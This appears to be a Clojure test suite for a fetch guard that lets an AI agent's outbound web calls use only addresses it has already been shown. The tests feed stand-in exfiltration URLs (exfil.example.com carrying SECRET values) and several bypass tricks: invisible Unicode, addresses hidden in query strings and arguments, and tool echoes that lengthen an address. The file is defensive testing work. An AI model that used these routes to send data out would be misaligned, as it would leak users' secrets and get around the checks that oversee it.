(ns relay.shown-test
  "The fetch rule (plan O1, I4): a scout's :egress call runs only when
  every address in it appeared verbatim in an earlier :egress result of
  its session."
  (:require [babashka.fs :as fs]
            [clojure.string :as str]
            [clojure.test :refer [deftest is testing]]
            [clojure.test.check.clojure-test :refer [defspec]]
            [clojure.test.check.generators :as gen]
            [clojure.test.check.properties :as prop]
            [relay.shown :as shown]))

(def page
  (str "url: https://grants.example.org/\nstatus: 200\n\n"
       "Open calls. Arts fund <https://arts.example.org/fund?year=2027>, and the harbour trust"
       " (https://harbour.example.net/apply).\n"))

(deftest a-shown-address-may-be-fetched
  (is (nil? (shown/refusal page {:url "https://grants.example.org/"})))
  (is (nil? (shown/refusal page {:url "https://arts.example.org/fund?year=2027"})))
  (is (nil? (shown/refusal page {:url "https://harbour.example.net/apply"})) "without the bracket after it")
  (testing "a search with no address in it needs nothing shown"
    (is (nil? (shown/refusal "" {:query "arts grants for small nonprofits"})))))

(deftest a-made-up-address-is-refused
  (doseq [url ["https://grants.example.org/?q=SECRET"
               "https://exfil.example.com/"
               "https://arts.example.org/fund?year=2028"
               "HTTPS://grants.example.org/"]]
    (is (= shown/refused-made-up (shown/refusal page {:url url})) url))
  (testing "nothing is shown at the start of a session"
    (is (= shown/refused-made-up (shown/refusal "" {:url "https://grants.example.org/"})))))

(deftest a-url-is-one-address-with-its-scheme
  (doseq [url ["grants.example.org/" "" " https://grants.example.org/" "https://grants.example.org/\n"
               "https://grants.example.org/\u00a0" "https://grants.example.org/\u3000" "https://grants.\u200bexample.org/"
               nil 3 ["https://grants.example.org/"]]]
    (is (= shown/refused-malformed (shown/refusal (str page " grants.example.org/") {:url url})) (pr-str url))))

(deftest an-address-anywhere-in-the-call-must-have-been-shown
  (testing "a query cannot carry an address the tool might echo back as a result"
    (is (= shown/refused-made-up (shown/refusal page {:query "no results for https://exfil.example.com/?d=SECRET"})))
    (is (= shown/refused-made-up (shown/refusal page {:query "\"x://exfil.example.com/SECRET\""}))))
  (testing "a shown address at the end of a query is fine"
    (is (nil? (shown/refusal page {:query "deadline https://arts.example.org/fund?year=2027"}))))
  (testing "but nothing may follow it, since the tool echoes the query as written"
    (doseq [q ["deadline https://arts.example.org/fund?year=2027."
               "https://arts.example.org/fund?!.,;:)]}>"
               "https://arts.example.org/fund deadline"
               "https://arts.example.org/fund\nSECRET"
               "https://arts.example.org/fund\u200bSECRET"
               "https://arts.example.org/fund\u00a0SECRET"
               "https://arts.example.org/fund\ue000"]]
      (is (#{shown/refused-inline shown/refused-made-up} (shown/refusal page {:query q})) (pr-str q))))
  (testing "nor in a command's arguments, a key or a nested value"
    (is (= shown/refused-made-up (shown/refusal page {:args ["--get" "https://exfil.example.com/SECRET"]})))
    (is (= shown/refused-made-up (shown/refusal page {:query "x" "https://exfil.example.com/SECRET" 1})))
    (is (= shown/refused-made-up (shown/refusal page {:opts {:next "https://exfil.example.com/SECRET"}})))))

(deftest addresses-lists-what-must-have-been-shown
  (is (= [[:url "https://a.example/x"] [:inline "https://b.example/y)."]]
         (shown/addresses {:url "https://a.example/x" :query "see (https://b.example/y)."})))
  (is (= [[:inline "aSECREThttps://b.example/y z"]] (shown/addresses {:query "x aSECREThttps://b.example/y z"}))
      "from the scheme as written, letters before it included, to the end of the string")
  (is (= [] (shown/addresses {:query "arts grants"})))
  (is (= [] (shown/addresses nil))))

;; --- I4 as a property

(def secret-gen (gen/fmap #(str "SECRET" %) (gen/large-integer* {:min 0})))

(def host-gen (gen/elements ["grants.example.org" "arts.example.org" "harbour.example.net" "exfil.example.com"]))

(def url-gen
  (gen/let [scheme (gen/elements ["https" "http"])
            host host-gen
            path (gen/vector (gen/elements ["a" "fund" "apply" "2027" "?q=1" "#top"]) 0 3)]
    (str scheme "://" host "/" (str/join "/" path))))

(def filler-gen
  (gen/fmap #(str/join " " %) (gen/vector (gen/elements ["Open" "calls." "See" "<" ">" "(" ")" "\n" "url:"]) 0 6)))

(def result-gen
  (gen/fmap #(apply str %) (gen/vector (gen/one-of [url-gen filler-gen]) 0 6)))

(def call-gen
  (gen/one-of
   [(gen/fmap (fn [u] {:url u}) url-gen)
    ;; a URL the model built, carrying something it was told
    (gen/let [u url-gen s secret-gen] {:url (str u "?d=" s)})
    (gen/let [u url-gen s secret-gen] {:query (str "find " u s)})
    (gen/fmap (fn [q] {:query q}) (gen/elements ["arts grants" "harbour sound society funding"]))]))

(def history-gen
  (gen/vector (gen/one-of [(gen/fmap (fn [r] [:result r]) result-gen)
                           (gen/fmap (fn [c] [:call c]) call-gen)])
              0 20))

(defn- run-session
  "Plays a session: each call is judged against the results before it.
  Returns [call allowed?] for each call."
  [history]
  (loop [[[kind x] & more] history shown [] out []]
    (if-not kind
      out
      (case kind
        :result (recur more (conj shown x) out)
        :call (recur more shown (conj out [x (nil? (shown/refusal (str/join "\n" shown) x)) shown]))))))

(defspec i4-a-call-runs-only-with-addresses-it-was-shown 300
  (prop/for-all [history history-gen]
    (every? (fn [[call allowed? before]]
              (let [text (str/join "\n" before)]
                (and
                 ;; Allowed only when every address it names was in an earlier result.
                 (or (not allowed?) (every? #(str/includes? text (second %)) (shown/addresses call)))
                 ;; A secret never in any result never leaves in an address.
                 (or (not allowed?)
                     (not-any? #(and (re-find #"SECRET\d+" (second %))
                                     (not (str/includes? text (re-find #"SECRET\d+" (second %)))))
                               (shown/addresses call)))
                 ;; And a URL shown before is always allowed.
                 (or (not (and (contains? call :url) (str/includes? text (:url call))
                               (= 1 (count (shown/addresses call)))))
                     allowed?))))
            (run-session history))))

(defspec a-url-from-a-result-is-allowed-and-one-more-character-is-not 200
  (prop/for-all [before result-gen u url-gen s secret-gen after result-gen]
    (let [text (str before "\n" u "\n" after)]
      (and (nil? (shown/refusal text {:url u}))
           (= (str/includes? text (str u s)) (nil? (shown/refusal text {:url (str u s)})))))))

;; --- a tool's echo of its query

(defn- escape
  "webtool's text/Escape: each rune it cannot print as \\u{XXXX}."
  [s ask?]
  (let [b (StringBuilder.)]
    (doseq [cp (iterator-seq (.iterator (.codePoints (str s))))]
      (let [t (Character/getType (int cp))
            invisible (and (not (#{10 9} cp))
                           (or (#{Character/CONTROL Character/FORMAT Character/PRIVATE_USE Character/UNASSIGNED
                                  Character/SURROGATE Character/LINE_SEPARATOR Character/PARAGRAPH_SEPARATOR} (byte t))
                               (<= 0xFE00 cp 0xFE0F) (<= 0xE0000 cp 0xE0FFF)))]
        (cond invisible (.append b (format "\\u{%04X}" cp))
              (and ask? (#{10 9 13} cp)) (.append b (format "\\u{%04X}" cp))
              :else (.appendCodePoint b (int cp)))))
    (str b)))

(defn- echoes
  "What webtool writes back for a query: search's \"No results\" and ask's
  header line."
  [q]
  [(str "No results for \"" (escape q false) "\".")
   (str "3 pages for \"" (escape q true) "\". Each page starts with a line \"=== page N 0a1b ===\".")])

(def query-gen
  (gen/let [s secret-gen
            parts (gen/vector (gen/one-of [url-gen
                                           (gen/return s)
                                           (gen/elements ["grants " "find" "https://" "x" "?!.,;:)]}>\"'`"
                                                          "\n" "\t" "\r" " " "\u00a0" "\u3000" "\u200b" "\u2028"
                                                          "\ue000" "\ufe0f" "\u0085"])])
                              0 6)]
    (apply str parts)))

(defn- urls-in
  "Every string in `text` that a url argument could be, from `from` on: a
  scheme at its start and no gap in it."
  [text from]
  (distinct
   (for [i (range from (count text))
         :when (re-find #"^[A-Za-z][A-Za-z0-9+.\-]*://" (subs text i))
         j (range (inc i) (inc (count text)))
         :let [u (subs text i j)]
         :while (= [u] (#'shown/runs u))
         :when (re-matches #"[A-Za-z][A-Za-z0-9+.\-]*://.*" u)]
     u)))

(def shown-and-query-gen
  "A session's shown text and a query. Often the query ends in text the
  shown text holds from one of its addresses on, gaps and all, and then
  something else half the time, so many such queries are allowed and
  some only by a rule that trims or splits."
  (gen/let [shown result-gen
            q query-gen
            ending (gen/one-of [(gen/return "") query-gen
                                (gen/elements ["." "?!.,;:)]}>" ")" "\"'`" "SECRET9"])])
            n gen/nat
            k (gen/choose 1 60)]
    (let [starts (vec (keep (fn [i] (when (re-find #"^[A-Za-z][A-Za-z0-9+.\-]*://" (subs shown i)) i))
                            (range (count shown))))]
      [shown (if (and (seq starts) (odd? n))
               (let [i (nth starts (mod n (count starts)))]
                 (str (str/replace q "://" "") (subs shown i (min (count shown) (+ i 10 k)))
                      (when (zero? (mod n 3)) ending)))
               q)])))

(defspec an-allowed-query-echoed-back-makes-no-new-address-fetchable 500
  (prop/for-all [[shown q] shown-and-query-gen]
    (or (some? (shown/refusal shown {:query q}))
        (every? (fn [echo]
                  (let [after (str shown "\n" echo)]
                    (every? (fn [u]
                              (or (some? (shown/refusal after {:url u}))
                                  (nil? (shown/refusal shown {:url u}))
                                  ;; Only the echo's own closing quote and full stop
                                  ;; may follow a shown address.
                                  (some #(and (str/ends-with? u %)
                                              (nil? (shown/refusal shown {:url (subs u 0 (- (count u) (count %)))})))
                                        ["\"" "\"."])))
                            (urls-in after (inc (count shown))))))
                (echoes q)))))

(deftest an-echo-cannot-lengthen-a-shown-address
  (let [s (str page "\n")
        q "https://arts.example.org/fund?!.,;:)]}>"]
    (is (some? (shown/refusal s {:query q})) "the query is refused")
    (testing "and had it run, its echo would have made the long address fetchable"
      (is (nil? (shown/refusal (str s (first (echoes q))) {:url q}))))))

;; --- the record

(deftest the-record-is-kept-per-wake-and-follows-a-resumed-session
  (let [dir (str (fs/create-temp-dir {:prefix "relay-shown"}))
        state {:wakes {1 {:id 1 :role "scout"}
                       2 {:id 2 :role "scout" :resumes 1}
                       3 {:id 3 :role "scout"}
                       4 {:id 4 :role "hub" :resumes 1}
                       5 {:id 5 :role "scout" :resumes 5}}}]
    (try
      (shown/record! dir "scout" 1 "first https://a.example/x")
      (shown/record! dir "scout" 2 "second")
      (shown/record! dir "scout" 3 "other https://b.example/y")
      (is (= [2 1] (shown/session-wakes state "scout" 2)))
      (is (= [3] (shown/session-wakes state "scout" 3)))
      (is (= [] (shown/session-wakes state "scout" 4)) "another role's wake counts for nothing")
      (is (= [] (shown/session-wakes state "scout" 99)))
      (is (= [5] (shown/session-wakes state "scout" 5)) "a loop ends")
      (let [text (shown/read-shown dir "scout" (shown/session-wakes state "scout" 2))]
        (is (str/includes? text "https://a.example/x"))
        (is (not (str/includes? text "https://b.example/y"))))
      (testing "two results never run together into one address"
        (shown/record! dir "scout" 3 "https://b.example/")
        (shown/record! dir "scout" 3 "evil")
        (is (some? (shown/refusal (shown/read-shown dir "scout" [3]) {:url "https://b.example/evil"}))))
      (finally (fs/delete-tree dir)))))
